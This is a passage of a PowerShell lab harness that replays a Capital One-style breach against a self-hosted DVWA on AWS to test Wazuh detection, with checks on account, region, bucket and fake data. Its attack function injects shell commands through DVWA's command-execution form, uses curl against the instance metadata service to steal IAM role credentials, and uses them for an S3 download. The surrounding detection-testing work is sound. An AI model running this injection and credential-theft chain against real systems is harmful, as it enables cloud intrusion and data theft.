#requires -Version 7.4
[CmdletBinding()]
param(
    [switch]$LibraryOnly,
    [string]$AwsProfile = 'terra-user',
    [string]$ShuffleV2WorkflowId = '',
    [string]$ExpectedBucket = '',
    [string]$RuntimeRoot = '',
    [string]$SecretRoot = '',
    [ValidateRange(30, 900)][int]$DeliveryGraceSeconds = 600,
    [ValidateRange(30, 300)][int]$CloudTrailLookbackSeconds = 180,
    [ValidateRange(600, 3600)][int]$RunObservationBudgetSeconds = 3300,
    [string]$ConfirmRun = ''
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

# This adapter is the only concrete boundary for GT02/GT03.  The generic
# runner remains a contract engine; this file owns the fixed lab operations
# and never accepts a caller-supplied provider or provenance value.
$script:AdapterExpectedAccountId = '433048100798'
$script:AdapterExpectedRegion = 'ap-northeast-2'
$script:AdapterExpectedRoleName = 'aws-topology-primary-karpenter-node'
$script:AdapterExpectedObjectKey = 'validation/capital-one-demo.csv'
$script:AdapterExpectedOtherPrefixObjectKey = 'other-prefix/capital-one-demo.csv'
$script:AdapterExpectedRuleIds = @('100103','100104')
$script:AdapterNegativeCases = @('normal_operator','other_bucket','other_prefix','other_principal','failure')
$script:AdapterStablePolls = 2
$script:AdapterSessionSafetyMarginSeconds = 300
$script:AdapterState = $null
$script:AdapterWazuhRulePath = 'D:\Wazuh\wazuh-docker\single-node\config\wazuh_cluster\rules\capital_one_rules.xml'
$script:AdapterV1WorkflowName = 'CAPITAL-ONE-SOC-CONTAINMENT-v1'
$script:AdapterV2WorkflowName = 'CAPITAL-ONE-SOC-CONTAINMENT-v2'

function New-GtLiveFailure {
    param([Parameter(Mandatory)][string]$Category)
    if ($Category -notmatch '^[a-z0-9_:-]{3,80}$') { $Category = 'operation_failed' }
    return [InvalidOperationException]::new("GT02/GT03 live adapter stopped safely: $Category")
}

function Get-GtLiveContract {
    return [pscustomobject][ordered]@{
        adapter_name = 'Invoke-CapitalOneGt02Gt03Live'
        provider_provenance = 'live-adapter-fixed'
        expected_account_id = $script:AdapterExpectedAccountId
        expected_region = $script:AdapterExpectedRegion
        expected_role_name = $script:AdapterExpectedRoleName
        expected_object_key = $script:AdapterExpectedObjectKey
        expected_rule_ids = @($script:AdapterExpectedRuleIds)
        negative_cases = @($script:AdapterNegativeCases)
        negative_expected_counts = [pscustomobject][ordered]@{
            normal_operator=3;other_bucket=1;other_prefix=1;other_principal=1;failure=1
        }
        stable_polls_required = $script:AdapterStablePolls
        run_observation_budget_seconds = $RunObservationBudgetSeconds
        session_safety_margin_seconds = $script:AdapterSessionSafetyMarginSeconds
        other_principal_profile_mode = 'terraform_managed_role'
        gt03_shuffle_integration = 'inactive'
        take_id_mode = 'external-runner-metadata-only'
        accepts_provider_scriptblocks = $false
        accepts_caller_provenance = $false
        durable_json = $false
        runtime_engine = 'Invoke-CapitalOneGt02Gt03Runtime.ps1'
    }
}

function Invoke-GtLiveNative {
    param(
        [Parameter(Mandatory)][string]$FilePath,
        [Parameter(Mandatory)][string[]]$ArgumentList,
        [Parameter(Mandatory)][string]$FailureCategory
    )
    $old = $ErrorActionPreference
    try {
        $ErrorActionPreference = 'Continue'
        $output = & $FilePath @ArgumentList 2>$null
        $exitCode = $LASTEXITCODE
    } finally { $ErrorActionPreference = $old }
    if ($exitCode -ne 0) { throw (New-GtLiveFailure -Category $FailureCategory) }
    return (($output | Out-String).Trim())
}

function Get-GtLiveProperty {
    param([AllowNull()][object]$Object,[Parameter(Mandatory)][string[]]$Names)
    if ($null -eq $Object) { return $null }
    foreach ($name in $Names) {
        if ($Object -is [Collections.IDictionary] -and $Object.Contains($name)) { return $Object[$name] }
        $p = @($Object.PSObject.Properties | Where-Object Name -ieq $name | Select-Object -First 1)
        if ($p.Count -eq 1) { return $p[0].Value }
    }
    return $null
}

function Assert-GtLiveObservationBudget {
    if ($null -eq $script:AdapterState) {
        throw (New-GtLiveFailure -Category 'run_observation_budget_exhausted')
    }
    $value = Get-GtLiveProperty -Object $script:AdapterState -Names @('RunDeadlineUtc')
    try { $deadline = [DateTimeOffset]$value }
    catch { throw (New-GtLiveFailure -Category 'run_observation_budget_exhausted') }
    if ($deadline -le [DateTimeOffset]::UtcNow) {
        throw (New-GtLiveFailure -Category 'run_observation_budget_exhausted')
    }
    return $deadline
}

function Get-GtLiveAwsEnvironmentSnapshot {
    # Capture every AWS_* process variable, including variables not used by this
    # adapter.  Credential cleanup must not accidentally change the caller's
    # AWS profile, endpoint, retry, or account-selection environment.
    $snapshot = [ordered]@{}
    foreach ($entry in [Environment]::GetEnvironmentVariables('Process').GetEnumerator()) {
        if ([string]$entry.Key -like 'AWS_*') {
            $snapshot[[string]$entry.Key] = [string]$entry.Value
        }
    }
    return $snapshot
}

function Restore-GtLiveAwsEnvironment {
    param([Parameter(Mandatory)][Collections.IDictionary]$Snapshot)
    $currentNames = @(
        [Environment]::GetEnvironmentVariables('Process').Keys |
            ForEach-Object { [string]$_ } |
            Where-Object { $_ -like 'AWS_*' }
    )
    foreach ($name in $currentNames) {
        if (-not $Snapshot.Contains($name)) {
            [Environment]::SetEnvironmentVariable($name, $null, 'Process')
        }
    }
    foreach ($entry in $Snapshot.GetEnumerator()) {
        [Environment]::SetEnvironmentVariable([string]$entry.Key, [string]$entry.Value, 'Process')
    }
}

function Get-GtLiveSha256 {
    param([Parameter(Mandatory)][string]$Text)
    $bytes = [Text.Encoding]::UTF8.GetBytes($Text)
    try { return ([Security.Cryptography.SHA256]::HashData($bytes) | ForEach-Object ToString x2) -join '' }
    finally { [Array]::Clear($bytes, 0, $bytes.Length) }
}

function ConvertTo-GtLiveCanonicalValue {
    param([AllowNull()][object]$Value)
    if ($null -eq $Value) { return $null }
    if ($Value -is [Collections.IDictionary]) {
        $ordered = [ordered]@{}
        foreach ($key in @($Value.Keys | ForEach-Object { [string]$_ } | Sort-Object)) {
            $ordered[$key] = ConvertTo-GtLiveCanonicalValue $Value[$key]
        }
        return [pscustomobject]$ordered
    }
    if ($Value -is [Collections.IEnumerable] -and $Value -isnot [string]) {
        return @($Value | ForEach-Object { ConvertTo-GtLiveCanonicalValue $_ })
    }
    $properties = @($Value.PSObject.Properties | ForEach-Object { $_.Name })
    if ($properties.Count -gt 0) {
        $ordered = [ordered]@{}
        foreach ($key in @($properties | Sort-Object)) {
            $ordered[$key] = ConvertTo-GtLiveCanonicalValue $Value.$key
        }
        return [pscustomobject]$ordered
    }
    return $Value
}

function ConvertTo-GtLiveCanonicalJson {
    param([AllowNull()][object]$Value)
    return (ConvertTo-GtLiveCanonicalValue $Value | ConvertTo-Json -Depth 100 -Compress)
}

function Convert-GtLiveUtc {
    param([Parameter(Mandatory)][object]$Value)
    try { return [DateTimeOffset]::Parse([string]$Value).ToUniversalTime() }
    catch { throw (New-GtLiveFailure -Category 'runtime_shape') }
}

function Assert-GtLiveSafeId {
    param([Parameter(Mandatory)][string]$Value,[Parameter(Mandatory)][string]$Label)
    if ($Value -notmatch '^[A-Za-z0-9._:/-]{1,200}$') { throw (New-GtLiveFailure -Category "runtime_shape_$Label") }
}

function Get-GtLiveRuntimeRoot {
    param([string]$Root = '')
    if ($Root) { return [IO.Path]::GetFullPath($Root) }
    if (-not $env:LOCALAPPDATA) { throw (New-GtLiveFailure -Category 'missing_runtime_root') }
    return Join-Path $env:LOCALAPPDATA 'aws-topology\soc-runtime'
}

function Assert-GtLiveSessionBudget {
    param(
        [Parameter(Mandatory)][DateTimeOffset]$Now,
        [Parameter(Mandatory)][DateTimeOffset]$DailyDeadline,
        [AllowNull()][object]$SessionExpiry = $null,
        [ValidateRange(600, 3600)][int]$MaxRunSeconds = $RunObservationBudgetSeconds
    )
    $minimumEnd = $Now.AddSeconds($MaxRunSeconds + $script:AdapterSessionSafetyMarginSeconds)
    $expiryTooShort = $false
    if ($null -ne $SessionExpiry) {
        try { $expiryTooShort = ([DateTimeOffset]$SessionExpiry -le $minimumEnd) }
        catch { $expiryTooShort = $true }
    }
    if ($DailyDeadline -le $minimumEnd -or $expiryTooShort) {
        throw (New-GtLiveFailure -Category 'session_deadline')
    }
    return $minimumEnd
}

function Get-GtLiveSession {
    $root = Get-GtLiveRuntimeRoot -Root ([string]$script:AdapterState.RuntimeRoot)
    $path = Join-Path $root 'active-soc-session.json'
    if (-not (Test-Path -LiteralPath $path -PathType Leaf)) { throw (New-GtLiveFailure -Category 'missing_active_session') }
    try { $state = Get-Content -LiteralPath $path -Raw | ConvertFrom-Json } catch { throw (New-GtLiveFailure -Category 'runtime_shape') }
    foreach ($name in @('schema_version','status','session_path','bridge_lock_path','heartbeat_path','response_mode','scope','daily_hard_deadline_at_utc')) {
        if ($null -eq $state.PSObject.Properties[$name] -or [string]::IsNullOrWhiteSpace([string]$state.$name)) {
            throw (New-GtLiveFailure -Category "missing_session_$name")
        }
    }
    if ([int]$state.schema_version -ne 1 -or
        [string]$state.status -notin @('READY','RUNNING') -or
        [string]$state.response_mode -cne 'observe_only' -or
        [string]$state.scope -cne 'detection_only') { throw (New-GtLiveFailure -Category 'gt03_shuffle_integration_active') }
    $sessionCheckAt = [DateTimeOffset]::UtcNow
    try {
        $dailyDeadline = Convert-GtLiveUtc $state.daily_hard_deadline_at_utc
    } catch { throw (New-GtLiveFailure -Category 'session_deadline') }
    $sessionPath = [IO.Path]::GetFullPath([string]$state.session_path)
    $rootPrefix = [IO.Path]::GetFullPath((Get-GtLiveRuntimeRoot -Root ([string]$script:AdapterState.RuntimeRoot))).TrimEnd('\') + '\'
    if (-not $sessionPath.StartsWith($rootPrefix,[StringComparison]::OrdinalIgnoreCase)) { throw (New-GtLiveFailure -Category 'session_path_escape') }
    if (-not (Test-Path -LiteralPath $sessionPath -PathType Container)) { throw (New-GtLiveFailure -Category 'missing_session_directory') }
    $heartbeatPath=[IO.Path]::GetFullPath([string]$state.heartbeat_path);$lockPath=[IO.Path]::GetFullPath([string]$state.bridge_lock_path)
    $sessionPrefix=$sessionPath.TrimEnd('\')+'\'
    if(-not $heartbeatPath.StartsWith($sessionPrefix,[StringComparison]::OrdinalIgnoreCase) -or -not $lockPath.StartsWith($sessionPrefix,[StringComparison]::OrdinalIgnoreCase)){throw (New-GtLiveFailure -Category 'session_path_escape')}
    try { $heartbeat=Get-Content -LiteralPath $heartbeatPath -Raw | ConvertFrom-Json } catch { throw (New-GtLiveFailure -Category 'bridge_heartbeat_unavailable') }
    foreach($field in @('heartbeat_at_utc','dlq_visible','queue_not_visible','queue_oldest_age_seconds')){if($null -eq $heartbeat.PSObject.Properties[$field]){throw (New-GtLiveFailure -Category 'bridge_heartbeat_shape')}}
    try{$heartbeatAt=Convert-GtLiveUtc $heartbeat.heartbeat_at_utc;$null=[int]$heartbeat.dlq_visible;$null=[int]$heartbeat.queue_not_visible;$null=[int]$heartbeat.queue_oldest_age_seconds}catch{throw (New-GtLiveFailure -Category 'bridge_heartbeat_shape')}
    $heartbeatExpiry = $null
    if ($heartbeat.PSObject.Properties['session_expires_at_utc'] -and
        -not [string]::IsNullOrWhiteSpace([string]$heartbeat.session_expires_at_utc)) {
        try {
            $heartbeatExpiry = Convert-GtLiveUtc $heartbeat.session_expires_at_utc
        } catch { throw (New-GtLiveFailure -Category 'session_deadline') }
    }
    [void](Assert-GtLiveSessionBudget -Now $sessionCheckAt -DailyDeadline $dailyDeadline -SessionExpiry $heartbeatExpiry -MaxRunSeconds $RunObservationBudgetSeconds)
    if(([DateTimeOffset]::UtcNow-$heartbeatAt).TotalSeconds -gt 30 -or $heartbeatAt -gt [DateTimeOffset]::UtcNow.AddSeconds(5) -or [string]$heartbeat.state -notin @('READY','RUNNING') -or [int]$heartbeat.dlq_visible -ne 0 -or [int]$heartbeat.queue_not_visible -ne 0 -or [int]$heartbeat.queue_oldest_age_seconds -gt 120) {
        throw (New-GtLiveFailure -Category 'bridge_not_ready')
    }
    $script:AdapterState.Session = $state
    $script:AdapterState.DailyDeadline = $dailyDeadline
    $script:AdapterState.HeartbeatAt = $heartbeatAt
    $script:AdapterState.LivePath = Join-Path (Split-Path -Parent ([IO.Path]::GetFullPath([string]$state.bridge_lock_path))) 'wazuh-push-live.jsonl'
    return $state
}

function Get-GtLiveApplicationUri {
    $root = [IO.Path]::GetFullPath((Join-Path $PSScriptRoot '..\..'))
    $text = Invoke-GtLiveNative -FilePath 'terraform' -ArgumentList @("-chdir=$root",'output','-raw','application_url') -FailureCategory 'missing_dvwa_url'
    try {
        $uri = [uri]$text.Trim()
        if ($uri.Scheme -cne 'https' -or -not $uri.Host) { throw 'invalid' }
        return $uri
    } catch { throw (New-GtLiveFailure -Category 'invalid_dvwa_url') }
}

function Assert-GtLiveShuffleIntegrationInactive {
    $state = $script:AdapterState.Session
    if ($null -eq $state -or [string]$state.scope -cne 'detection_only') {
        throw (New-GtLiveFailure -Category 'gt03_shuffle_integration_active')
    }
    $managerPath = Join-Path ([IO.Path]::GetFullPath([string]$state.session_path)) 'wazuh\ossec.conf'
    if (-not (Test-Path -LiteralPath $managerPath -PathType Leaf)) {
        throw (New-GtLiveFailure -Category 'gt03_integration_state_unknown')
    }
    $managerText = Get-Content -LiteralPath $managerPath -Raw -Encoding UTF8
    if ($managerText -match '(?is)<integration\b|<name>\s*custom-shuffle-soc\s*</name>') {
        throw (New-GtLiveFailure -Category 'gt03_shuffle_integration_active')
    }
}

function Resolve-GtLiveExpectedBucket {
    $root=[IO.Path]::GetFullPath((Join-Path $PSScriptRoot '..\..'))
    $text=Invoke-GtLiveNative -FilePath 'terraform' -ArgumentList @("-chdir=$root",'output','-raw','primary_application_bucket_name') -FailureCategory 'missing_primary_bucket'
    $bucket=$text.Trim()
    if($bucket -notmatch '^[a-z0-9][a-z0-9.-]{1,61}[a-z0-9]$'){throw (New-GtLiveFailure -Category 'invalid_primary_bucket')}
    if($ExpectedBucket -and $ExpectedBucket -cne $bucket){throw (New-GtLiveFailure -Category 'primary_bucket_mismatch')}
    return $bucket
}

function Assert-GtLiveProviderIdentity {
    $identity=(Invoke-GtLiveNative -FilePath 'aws' -ArgumentList @('sts','get-caller-identity','--profile',$AwsProfile,'--region',$script:AdapterExpectedRegion,'--output','json','--no-cli-pager') -FailureCategory 'aws_identity')|ConvertFrom-Json
    if([string]$identity.Account -cne $script:AdapterExpectedAccountId){throw (New-GtLiveFailure -Category 'aws_account_mismatch')}
    $repo=(Invoke-GtLiveNative -FilePath 'gh' -ArgumentList @('repo','view','Unoh03/Uns-DVWA','--json','nameWithOwner') -FailureCategory 'github_identity')|ConvertFrom-Json
    if([string]$repo.nameWithOwner -cne 'Unoh03/Uns-DVWA'){throw (New-GtLiveFailure -Category 'github_repository_mismatch')}
    $script:AdapterState.NormalPrincipalArn = [string]$identity.Arn
}

function Resolve-GtLiveOtherBucket {
    $root=[IO.Path]::GetFullPath((Join-Path $PSScriptRoot '..\..'))
    $bucket=(Invoke-GtLiveTerraformOutput -WorkingDirectory $root -Format raw -Name 'capital_one_secondary_control_bucket_name' -FailureCategory 'missing_provider:negative_other_bucket').Trim()
    $region=(Invoke-GtLiveTerraformOutput -WorkingDirectory $root -Format raw -Name 'capital_one_secondary_control_region' -FailureCategory 'missing_provider:negative_other_bucket').Trim()
    $key=(Invoke-GtLiveTerraformOutput -WorkingDirectory $root -Format raw -Name 'capital_one_secondary_control_object_key' -FailureCategory 'missing_provider:negative_other_bucket').Trim()
    $expectedSha=(Invoke-GtLiveTerraformOutput -WorkingDirectory $root -Format raw -Name 'capital_one_secondary_control_object_sha256' -FailureCategory 'missing_provider:negative_other_bucket').Trim().ToLowerInvariant()
    if($bucket -notmatch '^[a-z0-9][a-z0-9.-]{1,61}[a-z0-9]$' -or
        $bucket -ceq $script:AdapterState.ExpectedBucket -or
        $region -cne $script:AdapterExpectedRegion -or
        $key -cne $script:AdapterExpectedObjectKey -or
        $expectedSha -notmatch '^[a-f0-9]{64}$'){
        throw (New-GtLiveFailure -Category 'missing_provider:negative_other_bucket')
    }
    try {
        $head = Invoke-GtLiveNative -FilePath 'aws' -ArgumentList @('s3api','head-object','--profile',$AwsProfile,'--region',$region,'--bucket',$bucket,'--key',$key,'--output','json','--no-cli-pager') -FailureCategory 'missing_provider:negative_other_bucket' | ConvertFrom-Json
        $actualSha=[string](Get-GtLiveProperty -Object $head.Metadata -Names @('sha256'))
        if ([int64]$head.ContentLength -le 0 -or $actualSha.ToLowerInvariant() -cne $expectedSha) { throw 'object_contract' }
    } catch { throw (New-GtLiveFailure -Category 'missing_provider:negative_other_bucket') }
    $script:AdapterState.OtherBucketRegion=$region
    $script:AdapterState.OtherBucketObjectKey=$key
    $script:AdapterState.OtherBucketObjectSha256=$expectedSha
    return $bucket
}

function Resolve-GtLiveOtherPrefixObject {
    $root=[IO.Path]::GetFullPath((Join-Path $PSScriptRoot '..\..'))
    $key=(Invoke-GtLiveTerraformOutput -WorkingDirectory $root -Format raw -Name 'capital_one_other_prefix_control_object_key' -FailureCategory 'missing_provider:negative_other_prefix').Trim()
    $expectedSha=(Invoke-GtLiveTerraformOutput -WorkingDirectory $root -Format raw -Name 'capital_one_other_prefix_control_object_sha256' -FailureCategory 'missing_provider:negative_other_prefix').Trim().ToLowerInvariant()
    if($key -cne $script:AdapterExpectedOtherPrefixObjectKey -or
        $key -ceq $script:AdapterExpectedObjectKey -or
        ($key -split '/',2)[0] -ceq ($script:AdapterExpectedObjectKey -split '/',2)[0] -or
        $expectedSha -notmatch '^[a-f0-9]{64}$'){
        throw (New-GtLiveFailure -Category 'missing_provider:negative_other_prefix')
    }
    try {
        $head=Invoke-GtLiveNative -FilePath 'aws' -ArgumentList @(
            's3api','head-object','--profile',$AwsProfile,'--region',$script:AdapterExpectedRegion,
            '--bucket',[string]$script:AdapterState.ExpectedBucket,'--key',$key,
            '--output','json','--no-cli-pager'
        ) -FailureCategory 'missing_provider:negative_other_prefix' | ConvertFrom-Json
        $actualSha=[string](Get-GtLiveProperty -Object $head.Metadata -Names @('sha256'))
        if([int64]$head.ContentLength -le 0 -or $actualSha.ToLowerInvariant() -cne $expectedSha){throw 'object_contract'}
    } catch { throw (New-GtLiveFailure -Category 'missing_provider:negative_other_prefix') }
    $script:AdapterState.OtherPrefixObjectKey=$key
    $script:AdapterState.OtherPrefixObjectSha256=$expectedSha
    return $key
}

function Get-GtLiveCallerIdentity {
    param([Parameter(Mandatory)][string]$Profile,[Parameter(Mandatory)][string]$FailureCategory)
    try {
        return (Invoke-GtLiveNative -FilePath 'aws' -ArgumentList @('sts','get-caller-identity','--profile',$Profile,'--region',$script:AdapterExpectedRegion,'--output','json','--no-cli-pager') -FailureCategory $FailureCategory) | ConvertFrom-Json
    } catch { throw (New-GtLiveFailure -Category $FailureCategory) }
}

function Resolve-GtLiveOtherPrincipalRoleArn {
    $root=[IO.Path]::GetFullPath((Join-Path $PSScriptRoot '..\..'))
    $roleArn=(Invoke-GtLiveTerraformOutput -WorkingDirectory $root -Format raw -Name 'capital_one_negative_control_role_arn' -FailureCategory 'missing_provider:negative_other_principal').Trim()
    if($roleArn -notmatch ('^arn:aws:iam::'+[regex]::Escape($script:AdapterExpectedAccountId)+':role/[A-Za-z0-9+=,.@_/-]{1,200}$') -or
        $roleArn -match ('/[^/]*'+[regex]::Escape($script:AdapterExpectedRoleName)+'$')){
        throw (New-GtLiveFailure -Category 'missing_provider:negative_other_principal')
    }
    return $roleArn
}

function Assert-GtLivePrincipalFixtures {
    $normal = Get-GtLiveCallerIdentity -Profile $AwsProfile -FailureCategory 'normal_principal_identity'
    $expectedNormalArn="arn:aws:iam::$($script:AdapterExpectedAccountId):user/terra-user"
    if ([string]$normal.Account -cne $script:AdapterExpectedAccountId -or [string]$normal.Arn -cne $expectedNormalArn) {
        throw (New-GtLiveFailure -Category 'missing_provider:negative_other_principal')
    }
    $roleArn=Resolve-GtLiveOtherPrincipalRoleArn
    $roleName=($roleArn -split '/')[-1]
    $role=Invoke-GtLiveNative -FilePath 'aws' -ArgumentList @('iam','get-role','--profile',$AwsProfile,'--role-name',$roleName,'--output','json','--no-cli-pager') -FailureCategory 'missing_provider:negative_other_principal' | ConvertFrom-Json
    if([string]$role.Role.Arn -cne $roleArn){throw (New-GtLiveFailure -Category 'missing_provider:negative_other_principal')}
    $assumeDocument=$role.Role.AssumeRolePolicyDocument
    if($assumeDocument -is [string]){$assumeDocument=[uri]::UnescapeDataString([string]$assumeDocument)|ConvertFrom-Json -Depth 100}
    $trustedPrincipals=@($assumeDocument.Statement | ForEach-Object {@($_.Principal.AWS)})
    if($expectedNormalArn -cnotin $trustedPrincipals){throw (New-GtLiveFailure -Category 'missing_provider:negative_other_principal')}
    $policy=Invoke-GtLiveNative -FilePath 'aws' -ArgumentList @('iam','get-role-policy','--profile',$AwsProfile,'--role-name',$roleName,'--policy-name','capital-one-negative-control-read','--output','json','--no-cli-pager') -FailureCategory 'missing_provider:negative_other_principal' | ConvertFrom-Json -Depth 100
    $document=$policy.PolicyDocument
    if($document -is [string]){$document=[uri]::UnescapeDataString([string]$document)|ConvertFrom-Json -Depth 100}
    $statements=@($document.Statement)
    $expectedResource="arn:aws:s3:::$($script:AdapterState.ExpectedBucket)/$($script:AdapterExpectedObjectKey)"
    if($statements.Count -ne 1 -or [string]$statements[0].Effect -cne 'Allow' -or
        (@($statements[0].Action) -join ',') -cne 's3:GetObject' -or
        (@($statements[0].Resource) -join ',') -cne $expectedResource){
        throw (New-GtLiveFailure -Category 'missing_provider:negative_other_principal')
    }
    $script:AdapterState.NormalPrincipalArn = [string]$normal.Arn
    $script:AdapterState.OtherPrincipalArn = $roleArn
}

function New-GtLiveDvwaSession {
    $base = Get-GtLiveApplicationUri
    $session = [Microsoft.PowerShell.Commands.WebRequestSession]::new()
    try {
        $login = Invoke-WebRequest -Uri ([uri]::new($base,'/login.php')) -WebSession $session -TimeoutSec 30
        $match = [regex]::Match([string]$login.Content,'name\s*=\s*["'']user_token["''][^>]*value\s*=\s*["'']([^"'']+)', 'IgnoreCase')
        if (-not $match.Success) { throw 'token' }
        [void](Invoke-WebRequest -Uri ([uri]::new($base,'/login.php')) -Method Post -WebSession $session -TimeoutSec 30 -Body @{username='admin';password='password';Login='Login';user_token=$match.Groups[1].Value})
        $page = Invoke-WebRequest -Uri ([uri]::new($base,'/vulnerabilities/exec/')) -WebSession $session -TimeoutSec 30
        $cookie = @($session.Cookies.GetCookies($base) | Where-Object Name -ceq 'security') | Select-Object -Last 1
        if (-not $cookie -or [string]$cookie.Value -cne 'low' -or [string]$page.Content -notmatch 'name\s*=\s*["'']ip["'']') { throw 'baseline' }
        return [pscustomobject]@{ BaseUri=$base; Session=$session }
    } catch { $session = $null; throw (New-GtLiveFailure -Category 'dvwa_not_low') }
}

function Invoke-GtLiveDvwaOperation {
    param([Parameter(Mandatory)][string]$TakeId,[Parameter(Mandatory)][ValidateSet('attack','normal')][string]$Kind)
    $awsEnvironmentSnapshot = Get-GtLiveAwsEnvironmentSnapshot
    $dvwa = if ($script:AdapterState.Dvwa) { $script:AdapterState.Dvwa } else { $script:AdapterState.Dvwa = New-GtLiveDvwaSession }
    $started = [DateTimeOffset]::UtcNow
    # The attack begins with the IMDS role lookup.  No dummy command is sent;
    # the two fixed IMDS requests and the subsequent S3 GetObject are the
    # actual controlled chain that produces the source events.
    $input = if ($Kind -ceq 'normal') { '127.0.0.1; printf normal-control' } else { $null }
    $credentialDocument=$null
    $downloadPath=Join-Path ([IO.Path]::GetTempPath()) ('gt-' + [guid]::NewGuid().ToString('N') + '.bin')
    try {
        if ($Kind -ceq 'normal') {
            $response = Invoke-WebRequest -Uri ([uri]::new($dvwa.BaseUri,'/vulnerabilities/exec/')) -Method Post -WebSession $dvwa.Session -TimeoutSec 30 -Body @{ip=$input;Submit='Submit'}
            if ([int]$response.StatusCode -ne 200) { throw 'status' }
        }
        if ($Kind -ceq 'attack') {
            # This is the proven Capital One chain, kept in memory only:
            # DVWA -> IMDS role -> IMDS credentials -> STS -> fixed S3 GetObject.
            $roleStart='__GT_ROLE_BEGIN__';$roleEnd='__GT_ROLE_END__'
            $roleInput="127.0.0.1; printf '\n$roleStart\n'; curl -s --max-time 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/; printf '\n$roleEnd\n'"
            $roleResponse=Invoke-WebRequest -Uri ([uri]::new($dvwa.BaseUri,'/vulnerabilities/exec/')) -Method Post -WebSession $dvwa.Session -TimeoutSec 30 -Body @{ip=$roleInput;Submit='Submit'}
            $decoded=[Net.WebUtility]::HtmlDecode([string]$roleResponse.Content);$a=$decoded.IndexOf($roleStart,[StringComparison]::Ordinal);$b=if($a -ge 0){$decoded.IndexOf($roleEnd,$a+$roleStart.Length,[StringComparison]::Ordinal)}else{-1}
            if($a -lt 0 -or $b -lt 0 -or $decoded.Substring($a+$roleStart.Length,$b-$a-$roleStart.Length).Trim() -cne $script:AdapterExpectedRoleName){throw 'role'}
            $credStart='__GT_CREDENTIALS_BEGIN__';$credEnd='__GT_CREDENTIALS_END__'
            $credInput="127.0.0.1; printf '\n$credStart\n'; curl -s --max-time 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/$($script:AdapterExpectedRoleName); printf '\n$credEnd\n'"
            $credResponse=Invoke-WebRequest -Uri ([uri]::new($dvwa.BaseUri,'/vulnerabilities/exec/')) -Method Post -WebSession $dvwa.Session -TimeoutSec 30 -Body @{ip=$credInput;Submit='Submit'}
            $decoded=[Net.WebUtility]::HtmlDecode([string]$credResponse.Content);$a=$decoded.IndexOf($credStart,[StringComparison]::Ordinal);$b=if($a -ge 0){$decoded.IndexOf($credEnd,$a+$credStart.Length,[StringComparison]::Ordinal)}else{-1}
            if($a -lt 0 -or $b -lt 0){throw 'credentials'}
            $credentialDocument=$decoded.Substring($a+$credStart.Length,$b-$a-$credStart.Length).Trim()|ConvertFrom-Json
            if([string]$credentialDocument.Code -cne 'Success' -or [string]$credentialDocument.AccessKeyId -notmatch '^(AKIA|ASIA)[A-Z0-9]{16}$' -or [string]::IsNullOrWhiteSpace([string]$credentialDocument.SecretAccessKey) -or [string]::IsNullOrWhiteSpace([string]$credentialDocument.Token) -or [DateTimeOffset]$credentialDocument.Expiration -le [DateTimeOffset]::UtcNow.AddMinutes(5)){throw 'credential_contract'}
            $env:AWS_ACCESS_KEY_ID=[string]$credentialDocument.AccessKeyId;$env:AWS_SECRET_ACCESS_KEY=[string]$credentialDocument.SecretAccessKey;$env:AWS_SESSION_TOKEN=[string]$credentialDocument.Token;$env:AWS_REGION=$script:AdapterExpectedRegion;$env:AWS_DEFAULT_REGION=$script:AdapterExpectedRegion;$env:AWS_EC2_METADATA_DISABLED='true'
            $arn=Invoke-GtLiveNative -FilePath 'aws' -ArgumentList @('sts','get-caller-identity','--query','Arn','--output','text','--no-cli-pager') -FailureCategory 'stolen_role_sts'
            if($arn -notmatch ('^arn:aws:sts::'+[regex]::Escape($script:AdapterExpectedAccountId)+':assumed-role/'+[regex]::Escape($script:AdapterExpectedRoleName)+'/[^/]+$')){throw 'stolen_role_identity'}
            $script:AdapterState.StolenPrincipalArn=[string]$arn
            $script:AdapterState.StolenCredentials=[pscustomobject]@{
                AccessKeyId=[string]$credentialDocument.AccessKeyId
                SecretAccessKey=[string]$credentialDocument.SecretAccessKey
                SessionToken=[string]$credentialDocument.Token
                Expiration=([DateTimeOffset]$credentialDocument.Expiration)
            }
            [void](Invoke-GtLiveNative -FilePath 'aws' -ArgumentList @('s3api','get-object','--region',$script:AdapterExpectedRegion,'--bucket',$script:AdapterState.ExpectedBucket,'--key',$script:AdapterExpectedObjectKey,$downloadPath,'--output','json','--no-cli-pager') -FailureCategory 'stolen_role_s3')
            if(-not(Test-Path -LiteralPath $downloadPath -PathType Leaf) -or (Get-Item -LiteralPath $downloadPath).Length -le 0){throw 's3_object'}
        }
    } catch { throw (New-GtLiveFailure -Category "dvwa_$Kind") }
    finally {
        Restore-GtLiveAwsEnvironment -Snapshot $awsEnvironmentSnapshot
        $input=$null;$credentialDocument=$null;$decoded=$null;Remove-Item -LiteralPath $downloadPath -Force -ErrorAction SilentlyContinue
    }
    return [pscustomobject]@{ started_at_utc=$started.ToString('o'); finished_at_utc=([DateTimeOffset]::UtcNow).ToString('o') }
}

function Invoke-GtLiveTerraformOutput {
    param([Parameter(Mandatory)][string]$WorkingDirectory,[Parameter(Mandatory)][ValidateSet('raw','json')][string]$Format,[Parameter(Mandatory)][string]$Name,[Parameter(Mandatory)][string]$FailureCategory)
    $root = [IO.Path]::GetFullPath($WorkingDirectory)
    if (-not (Test-Path -LiteralPath $root -PathType Container)) { throw (New-GtLiveFailure -Category $FailureCategory) }
    $value = Invoke-GtLiveNative -FilePath 'terraform' -ArgumentList @("-chdir=$root",'output',"-$Format",$Name) -FailureCategory $FailureCategory
    if ([string]::IsNullOrWhiteSpace($value)) { throw (New-GtLiveFailure -Category $FailureCategory) }
    return $value
}

function Assert-GtLivePrimaryObject {
    $head = Invoke-GtLiveNative -FilePath 'aws' -ArgumentList @(
        's3api','head-object','--profile',$AwsProfile,'--region',$script:AdapterExpectedRegion,
        '--bucket',[string]$script:AdapterState.ExpectedBucket,'--key',$script:AdapterExpectedObjectKey,
        '--output','json','--no-cli-pager'
    ) -FailureCategory 'missing_provider:primary_object' | ConvertFrom-Json
    $hash = [string](Get-GtLiveProperty $head @('Metadata'))
    $contentHash = [string](Get-GtLiveProperty $head.Metadata @('sha256'))
    $trainingMarker = [string](Get-GtLiveProperty $head.Metadata @('training-marker'))
    $etag = [string](Get-GtLiveProperty $head @('ETag'))
    if ($contentHash -notmatch '^[a-f0-9]{64}$' -or
        $trainingMarker -cne 'FAKE_TRAINING_DATA' -or
        $etag -notmatch '^"[0-9a-fA-F]{32}(-[0-9]+)?"$' -or
        [int64]$head.ContentLength -le 0) {
